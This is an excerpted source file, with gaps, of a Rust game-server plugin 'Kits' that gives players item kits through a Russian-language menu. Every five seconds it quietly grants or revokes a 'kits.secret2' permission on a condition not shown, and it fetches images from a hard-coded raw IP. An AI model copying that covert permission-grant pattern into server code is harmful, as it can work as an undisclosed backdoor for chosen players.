...
namespace Oxide.Plugins
{
    ...
    class Kits : RustPlugin
    {
        ...
        {
            permission.RegisterPermission("kits.secret2", this);
            timer.Every(5, () =>
            {
                BasePlayer.activePlayerList.ToList().ForEach(p =>
                {
                    ...
                    {
                        permission.GrantUserPermission(p.UserIDString, "kits.secret2", this);
                    }
                    else
                    {
                        permission.RevokeUserPermission(p.UserIDString, "kits.secret2");
                    }
                });
            });
            
            foreach (var check in storedData.Kits.SelectMany(p => p.Value.items).Where(p => p.skinid != 0))
            {
                var name = ItemManager.FindItemDefinition(check.itemid).shortname; 
                plugins.Find("ImageLibrary").Call("AddImage", $"http://185.200.242.130:2007/rust/skin/getImage/{check.skinid}", name, check.skinid); 
            }
            foreach (var check in storedData.Kits.SelectMany(p => p.Value.items).Where(p => p.itemid != 0))
            {
                var name = ItemManager.FindItemDefinition(check.itemid).shortname; 
                plugins.Find("ImageLibrary").Call("AddImage", $"http://185.200.242.130:2007/rust/item/getImage/{name}/128", name);  
            }
            
            foreach (var check in storedData.Kits.Where(p => !p.Value.symbol.IsNullOrEmpty()))
            {
                plugins.Find("ImageLibrary").Call("AddImage", check.Value.inside, check.Key + "I"); 
                plugins.Find("ImageLibrary").Call("AddImage", check.Value.symbol, check.Key);
            }
        ...
        private void OnNewSave(string saveName)
        {
            ...
            {
                ResetData();
                PrintError($"Kits successful resetted!");
            }); 
        }

        [ConsoleCommand("kits.wipe")]
        private void CmdconsoleWuipe(ConsoleSystem.Arg args)
        {
            if (args.Player() != null && args.Player().net.connection.authLevel < 2) return;
                ...
                },
{
        ...
        void OnPlayerRespawned(BasePlayer player)
        {
            ...
            if (thereturn == null)
            {
                if (storedData.Kits.ContainsKey("autokit"))
                {
                    ...
                    item.GetHeldEntity().GetComponent<global::Detonator>().frequency = (int) plugins.Find("Detonator").Call("GetFrequencyForPlayer", player);
        ...
        private class BoxKit
        {
            ...
            public void ProcessItems(ItemContainer container)
            {
                for (int i = 0; i < Oxide.Core.Random.Range(MinAmount, MaxAmount); i++)
                {
                    var random = GetControlRandom();
                    var item = random.ToItem(); 

                    item.MoveToContainer(container);
                    if (random.AmmoString.Length > 0) 
                    {
                        Item ammo = ItemManager.CreateByName(random.AmmoString, random.AmmoAmount);
                        ammo.MoveToContainer(container);
                    }
                }
            }
        }
        
        private BoxKit kitHome = new BoxKit
        {
            MinAmount = 1,
            MaxAmount = 1,
        ...
        private BoxKit kit = new BoxKit
        {
            ...
            Items = new List<BoxItem>
            {
                ...
                new BoxItem
                {
                    ...
                    MinAmount = 1,
                    MaxAmount = 1,
                    AmmoString = "ammo.handmade.shell",
                    AmmoAmount = 4,
                    SkinID    = 0UL,
                    Weight    = 25
                },
        ...
        void TryGiveKit(BasePlayer player, string kitname)
        {
            ...
            Effect.server.Run("assets/bundled/prefabs/fx/impacts/slash/cloth/cloth1.prefab", player.transform.position); 
            if (kitname.ToLower() == "стартовый")
            { 
                // ТУТ СНИЗУ ВОТ ЦИФЕРКУ КОТОРАЯ БУДЕТ V ТУТ ПОМЕНЯТЬ НА ЛЮБУЮ ДРУГУЮ
                if (Oxide.Core.Random.Range(0, 100) > 25) return; 
                
                kit.ProcessItems(player.inventory.containerMain); 
            }
            if (kitname.ToLower() == "дом") 
            { 
                // ТУТ СНИЗУ ВОТ ЦИФЕРКУ КОТОРАЯ БУДЕТ V ТУТ ПОМЕНЯТЬ НА ЛЮБУЮ ДРУГУЮ
                if (Oxide.Core.Random.Range(0, 100) > 25) return; 
                
                kitHome.ProcessItems(player.inventory.containerMain); 
            }
        }
        ...
        object CanRedeemKit(BasePlayer player, string kitname, bool skipAuth = false)
        {
            ...
            if ((player.inventory.containerBelt.capacity - player.inventory.containerBelt.itemList.Count) < beltcount || (player.inventory.containerWear.capacity - player.inventory.containerWear.itemList.Count) < wearcount || (player.inventory.containerMain.capacity - player.inventory.containerMain.itemList.Count) < maincount)
                ...
                {
                    player.ChatMessage($"У вас <color=#e6533d>недостаточно места</color> в инвентаре!");
        ...
        [ChatCommand("kitshide")]
        private void CmdChatKitHide(BasePlayer player)
        {
            var info = Coroutines[player.userID];
            if (info != null)
            {
                ServerMgr.Instance.StopCoroutine(info); 
            }
            CuiHelper.DestroyUi(player, Layer);
        } 

        [ConsoleCommand("kitsshow")]
        private void CmdConsoleHandler(ConsoleSystem.Arg args)
        {
            if (args.HasArgs(4)) 
                DrawInside(args.Player(), storedData.Kits.ElementAt(int.Parse(args.Args[0])), int.Parse(args.Args[1]));    
            else if (args.HasArgs(3))
            { 
                TryGiveKit(args.Player(), storedData.Kits.ElementAt(int.Parse(args.Args[0])).Key);
                DrawUI(args.Player(), int.Parse(args.Args[1]));  
            }
            else if (args.HasArgs(1))
            {
                ...
                if (page == 0)
                { 
                    DrawUI(args.Player(), -1);
                    return;
                }
                DrawUI(args.Player(), page); 
            }
        }

        private static string NewLayer = "UI_KitssafsafLayer";
        private void DrawInside(BasePlayer player, KeyValuePair<string, Kit> kit, int page)
        {
            ...
            {
                RectTransform = {AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0"},
                Button        = {Color     = "0 0 0 0", Close = NewLayer, Command = "kitsshow " + page * -1}, 
                Text          = {Text      = ""}
            }, NewLayer);
/*
            container.Add(new CuiPanel
            ...
            container.Add(new CuiButton
            {
                ...
                Text          = { Text      = "<b><</b>", Color          = "1 1 1 1", Align = TextAnchor.MiddleRight, Font = "robotocondensed-regular.ttf", FontSize = 80 }
            }, NewLayer);
            ...
            container.Add(new CuiButton
            {
                ...
                Button        = { Color     = "0 0 0 0", Material  = "", Command          = $"kitsshow " + page }, 
                Text          = { Text      = "<b>></b>", Color           = "1 1 1 0.2", Align     = TextAnchor.MiddleLeft, Font = "robotocondensed-regular.ttf", FontSize = 80 }
            }, NewLayer);*/
            
            container.Add(new CuiButton 
            {
                RectTransform = { AnchorMin = "0.5 0.9", AnchorMax    = "0.5 0.9", OffsetMin   = "-200 -125", OffsetMax         = "200 25" },
                Button        = { Color     = "0 0 0 0", Material = "", Close          = Layer, Command                = $"kitsshow " + page },
                Text          = { Text      = kit.Value.name.ToUpper(), Color      = "1 1 1 0.6", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 32 }
            }, NewLayer);
            
            double xSwitch = 0;
            double ySwitch = 0;

            var list = kit.Value.items.ToList();
            if (kit.Key.ToLower() == "стартовый")
            {
                foreach (var check in this.kit.Items)
                    list.Add(new KitItem
                    {
                        itemid = ItemManager.FindItemDefinition(check.ShortName).itemid,
                        amount = check.MinAmount,
                        skinid = check.SkinID,
                    });
            }
            if (kit.Key.ToLower() == "дом")
            {
                foreach (var check in this.kitHome.Items)
                    list.Add(new KitItem
                    {
                        itemid = ItemManager.FindItemDefinition(check.ShortName).itemid,
                        amount = check.MinAmount,
            ...
            for (int i = 0; i < list.Count; i++)
            {
                ...
                container.Add(new CuiButton 
                {
                    ...
                    Button        = { Color     = "0.215 0.211 0.188 0.9", Command   = $""},
                    Text          = { Text      = "" } 
                ...
                container.Add(new CuiElement
                {
                    ...
                    Components =
                    { 
                        new CuiRawImageComponent {Png            = (string) ImageLibrary.Call("GetImage", ItemManager.FindItemDefinition(item.itemid).shortname, item.skinid) },
                ...
                if (item.container.IsNullOrEmpty())
                {
                    ...
                    { 
                        ...
                        Text          = {Text      = kit.Key.ToLower() == "стартовый" ? "25%" : "25%", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 42, Color = "1 1 1 0.4"}
                    }, NewLayer + $".BlockPanel.{i}");
                }
            }
        ...
        private static string Layer = "UI_KitsLayer";
        ...
        { 
            ...
            var defaultKill = storedData.Kits.Where(p => p.Key.ToLower() != "autokit" && p.Value.authlevel <= player.net.connection.authLevel && (p.Value.permission.IsNullOrEmpty() || permission.UserHasPermission(player.UserIDString, p.Value.permission)));
            var list = defaultKill.ToList();
            

            foreach (var check in defaultKill)
            {
                CuiHelper.DestroyUi(player, Layer + check.Key);
                CuiHelper.DestroyUi(player, Layer + check.Key + ".U");
            }
            ...
            {
                RectTransform = {AnchorMin = "0 0", AnchorMax   = "1 1", OffsetMax            = "0 0"},
                Button        = {Color     = "0 0 0 0", Command = "chat.say /kitshide" },
                Text          = {Text      = ""}
            }, Layer);

            int stringAmount = Mathf.CeilToInt(list.Count / 5f);
            float topPosition = (stringAmount / 2f) * 100 + ((StringAmount - 1) / 2f) * 10;
            
            var sdd = 5 / 2f * -100 - (5 - 1) / 2f * 10;
            
            while (list.Count != 0)
            {
                var newList = list.ToList().Take(5);
                var leftPosition = newList.Count() / 2f * -156 - (newList.Count() - 1) / 2f * 10;
            
                foreach (var check in newList) 
                { 
                    container.Add(new CuiPanel
                    {
                        RectTransform = {AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"{leftPosition - 10} {topPosition - 60}", OffsetMax = $"{leftPosition + 150} {topPosition}"},
                        Image         = {Color     = "0 0 0 0"}
                    }, Layer, Layer + check.Key + ".U");
                    ...
                    container.Add(new CuiLabel
                    { 
                        RectTransform = {AnchorMin = "0 0", AnchorMax        = "1 1", OffsetMax              = "0 2"},
                        Text          = {Text      = check.Value.name.ToUpper(), Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 17}
                    }, Layer + check.Key);

                    container.Add(new CuiButton
                    {
                        RectTransform = {AnchorMin = "0 0", AnchorMax   = "1 1", OffsetMax = "0 0"},
                        Button        = {Color     = "0 0 0 0", Command = $"kitsshow {storedData.Kits.ToList().IndexOf(check)} {page} asd"},
                        Text          = {Text      = ""}
                    }, Layer + check.Key);

                    var curCd = PlayerKitCooldown(player.userID, check.Key);
                    var axis = Math.Abs(curCd / check.Value.cooldown);
                    ...
                    {
                        axis = axis <= 1 ? 1 - axis : axis;

                        if (axis < 0.02) 
                            axis = 0.02f;
                    }
                    
                    string text = curCd > 0 ? "МОЖНО БРАТЬ" : SecToTime(Mathf.FloorToInt((float) curCd * -1));

                    if (!check.Value.symbol.IsNullOrEmpty())
                    {  
                        container.Add(new CuiElement
                        {
                            Parent = Layer + check.Key, 
                            Components =
                            {
                                new CuiRawImageComponent { Png = (string) plugins.Find("ImageLibrary").Call("GetImage", check.Key), Color = "1 1 1 0.5" },
                                new CuiRectTransformComponent { AnchorMin = "0.5 1", AnchorMax = "0.5 1", OffsetMin = "-6.5 -17", OffsetMax = "6.5 -4" },
                            }
                        }); 
                    }
                    ...
                    container.Add(new CuiLabel
                    {
                        RectTransform = {AnchorMin = "0 0", AnchorMax = "1 0", OffsetMax              = "0 30"},
                        Text          = {Text      = text, Align      = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 10, Color = "1 1 1 0.4"}
                    }, Layer + check.Key, Layer + check.Key + ".T");
                    
                    container.Add(new CuiPanel
                    { 
                        RectTransform = {AnchorMin = "0 0", AnchorMax = $"{axis} 1", OffsetMin = $"0 0", OffsetMax = $"0 0"},
                        Image         = {Color     = $"0.450 0.552 0.270 0.98"}
                    }, Layer + check.Key + ".U", Layer + check.Key + ".UP");
                    
                    container.Add(new CuiPanel
                    { 
                        RectTransform = {AnchorMin = $"{axis} 0", AnchorMax = $"1 1", OffsetMin = $"0 0", OffsetMax = $"0 0"},
                        Image         = {Color     = $"0.215 0.211 0.188 0.8" }
                    }, Layer + check.Key + ".U", Layer + check.Key + ".UD"); 
     
                    container.Add(new CuiButton
                    { 
                        RectTransform = {AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = $"0 -25", OffsetMax = "0 0"},
                        Button        = {Color     = "0.215 0.211 0.188 1", Command = $"kitsshow {storedData.Kits.ToList().IndexOf(check)} {page} asd sf", Material = ""}, 
                        Text          = {Text      = ""}
                    }, Layer + check.Key, Layer + check.Key + "?");

                    container.Add(new CuiLabel
                    {
                        RectTransform = {AnchorMin = "0 0", AnchorMax   = "1 1", OffsetMax              = "0 0"},
                        Text          = {Text      = "ПОДРОБНЕЕ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 13, Color = "0.776 0.741 0.705 0.4"}
                    }, Layer + check.Key + "?");
        ...
        private string SecToTime(int time)
        {
            ...
            if (span.Hours > 0)
                result += $" {span.Hours} ч";
            if (span.Minutes > 0)
                result += $" {span.Minutes} м";
            if (span.Seconds > 0)
                result += $" {span.Seconds} с";

            return result;
        }
 
        private Hash<ulong, Coroutine> Coroutines = new Hash<ulong, Coroutine>();
        private IEnumerator UpdateKits(BasePlayer player, List<KeyValuePair<string, Kit>> kits)
        {
            while (player.IsConnected) 
            {
                //PrintWarning("Update kits for " + player.userID); 
                CuiElementContainer container = new CuiElementContainer();
                ...
                { 
                    ...
                    CuiHelper.DestroyUi(player, Layer + check.Key + ".UP");
                    CuiHelper.DestroyUi(player, Layer + check.Key + ".UD");
                    CuiHelper.DestroyUi(player, Layer + check.Key + ".T");
                    container.Add(new CuiPanel
                    { 
                        RectTransform = {AnchorMin = "0 0", AnchorMax = $"{axis} 1", OffsetMin = $"0 0", OffsetMax = $"0 0"},
                        Image         = {Color     = $"0.5058 0.6078 0.3372 0.80"}
                    }, Layer + check.Key + ".U", Layer + check.Key + ".UP");
                    ...
                    container.Add(new CuiLabel
                    {
                        ...
                        Text          = {Text      = text, Align      = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 14, Color = "1 1 1 0.4"}
                    }, Layer + check.Key, Layer + check.Key + ".T");
